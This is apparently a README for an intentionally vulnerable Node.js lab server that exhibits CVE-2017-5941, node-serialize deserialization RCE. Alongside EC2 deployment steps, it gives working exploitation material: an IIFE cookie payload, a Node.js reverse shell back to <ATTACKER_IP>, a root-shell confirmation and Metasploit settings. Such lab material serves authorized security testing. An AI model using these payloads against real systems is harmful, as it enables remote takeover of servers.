# Vulnerable Node.js Server - CVE-2017-5941 (node-serialize RCE)

Vulnerable Node.js server using `node-serialize` 0.0.4 for testing deserialization RCE exploits.

> **WARNING**: Intentionally vulnerable - for authorized testing only.

## Vulnerability

| CVE | Description | CVSS | Impact |
|-----|-------------|------|--------|
| CVE-2017-5941 | `node-serialize` `unserialize()` executes IIFEs in serialized objects | 9.8 (Critical) | Remote Code Execution |

### How It Works

The `node-serialize` npm package (versions <= 0.0.4) contains an `unserialize()` function that evaluates JavaScript code. When a serialized object contains a function marked with the `_$$ND_FUNC$$_` prefix and terminated with `()` (IIFE pattern), the function is **executed during deserialization**.

```
Normal serialized object:
{"username":"guest","email":"guest@example.com"}

Malicious serialized object (with IIFE):
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

### Attack Surface

The `/profile` endpoint:
1. Reads the `profile` cookie (Base64-encoded)
2. Decodes it from Base64
3. Passes the decoded string directly to `serialize.unserialize()`
4. **No sanitization or validation** is performed

---

## EC2 Deployment (One Command)

### 1. Launch EC2
- **AMI**: Amazon Linux 2023 or Ubuntu 22.04
- **Type**: t2.micro
- **Security Group**: SSH (22) + Custom TCP (8080) - your IP only

### 2. Deploy (first time or any update)

```bash
#from folder /whitehat
ssh -i ~/.ssh/guinea_pigs.pem ubuntu@15.160.68.117 "mkdir -p ~/apache" && scp -i ~/.ssh/guinea_pigs.pem -r testing/guinea_pigs/node_serialize_1.0.0/* ubuntu@15.160.68.117:~/apache/ && ssh -i ~/.ssh/guinea_pigs.pem ubuntu@15.160.68.117 "bash ~/apache/setup.sh"
```

### 3. Wipe & Clean (remove everything)

```bash
#from folder /whitehat
# Stop container, remove images, volumes, and all Docker data
ssh -i ~/.ssh/guinea_pigs.pem ubuntu@15.160.68.117 "cd ~/apache && sudo docker-compose down && sudo docker system prune -a -f --volumes"
```

---

## Test Vulnerability

### Step 1: Get a Default Cookie

```bash
# Visit /profile to get a default serialized cookie
curl -v http://<IP>:8080/profile
# Look for Set-Cookie: profile=<base64> in the response
```

### Step 2: Verify the Cookie Content

```bash
# Decode the cookie to see the serialized object
echo '<base64_cookie>' | base64 -d
# Output: {"username":"guest","email":"guest@example.com","role":"viewer"}
```

### Step 3: Craft RCE Payload

```bash
# Create a payload that executes 'id' command
# The _$$ND_FUNC$$_ prefix + () suffix triggers IIFE execution
PAYLOAD='{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").execSync(\"id\").toString()}()"}'

# Base64 encode it
ENCODED=$(echo -n "$PAYLOAD" | base64)

# Send the malicious cookie
curl http://<IP>:8080/profile -b "profile=$ENCODED"
```

### Step 4: Reverse Shell (RCE to Root)

```bash
# Start a listener on your machine
nc -lvnp 4444

# Craft a reverse shell payload
PAYLOAD='{"rce":"_$$ND_FUNC$$_function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var client=new net.Socket();client.connect(4444,\"<ATTACKER_IP>\",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);})}()"}'

ENCODED=$(echo -n "$PAYLOAD" | base64)

curl http://<IP>:8080/profile -b "profile=$ENCODED"
```

### Step 5: Confirm Root Access

```
# In the reverse shell:
id
# uid=0(root) gid=0(root) groups=0(root)

whoami
# root
```

---

## Metasploit Exploitation

### Using exploit/multi/http/node_js_unserialize

```
msf6 > search node serialize
msf6 > search CVE-2017-5941

# If a direct module exists:
msf6 > use exploit/multi/http/node_js_unserialize
msf6 > set RHOSTS <target_ip>
msf6 > set RPORT 8080
msf6 > set TARGETURI /profile
msf6 > set PAYLOAD nodejs/shell_reverse_tcp
msf6 > set LHOST <attacker_ip>
msf6 > set LPORT 4444
msf6 > exploit
```

### Manual Exploitation via Metasploit Handler

```
# 1. Generate a Node.js reverse shell one-liner and embed it in the cookie
# 2. Set up a handler:
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD nodejs/shell_reverse_tcp
msf6 > set LHOST <attacker_ip>
msf6 > set LPORT 4444
msf6 > exploit -j

# 3. Trigger the payload via curl with the malicious cookie
```

---

## Architecture

```
                    ┌─────────────────────────────────┐
                    │         ATTACKER                 │
                    │                                  │
                    │  1. GET /profile                 │
                    │     Cookie: profile=<base64>     │
                    │                                  │
                    │  The cookie contains:            │
                    │  {"rce":"_$$ND_FUNC$$_           │
                    │   function(){                    │
                    │     reverse_shell(...)           │
                    │   }()"}                          │
                    └─────────────┬───────────────────┘
                                  │
                                  ▼
                    ┌─────────────────────────────────┐
                    │   VULNERABLE NODE.JS SERVER      │
                    │   (Running as root)              │
                    │                                  │
                    │  1. Read cookie                  │
                    │  2. Base64 decode                │
                    │  3. unserialize(decoded)  ← RCE  │
                    │  4. IIFE executes immediately    │
                    │  5. Reverse shell connects back  │
                    └─────────────────────────────────┘
```

---

## Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Landing page |
| `/health` | GET | Health check (returns `OK`) |
| `/status` | GET | System status (hostname, OS, Node version) |
| `/profile` | GET | **VULNERABLE** - Deserializes `profile` cookie |
| `/login` | POST | Sets a serialized profile cookie |

---

## AWS Target Group Health Check

Use this endpoint for ALB/NLB health checks:

| Setting | Value |
|---------|-------|
| **Path** | `/health` |
| **Port** | `8080` |
| **Protocol** | `HTTP` |
| **Success codes** | `200` |

---

## References

- [CVE-2017-5941 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-5941)
- [node-serialize npm](https://www.npmjs.com/package/node-serialize)
- [Exploiting Node.js deserialization bug for RCE (Original Research)](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

---

## Cleanup

```bash
docker-compose down          # Stop container
# Then terminate EC2 instance
```
